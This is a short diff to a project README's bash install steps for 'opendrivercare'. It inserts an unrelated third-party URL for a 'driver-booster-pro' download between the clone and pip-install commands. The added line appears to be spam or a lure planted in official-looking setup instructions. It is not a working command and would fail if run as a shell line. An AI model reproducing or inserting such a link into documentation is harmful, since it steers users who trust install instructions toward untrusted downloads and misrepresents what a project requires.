@@ -37,4 +37,5 @@
 ```bash
 git clone https://github.com/yourname/opendrivercare
 cd opendrivercare
+https://fixdownload.com/software/system-utilities/optimization/driver-booster-pro-download/
 pip install -r requirements.txt
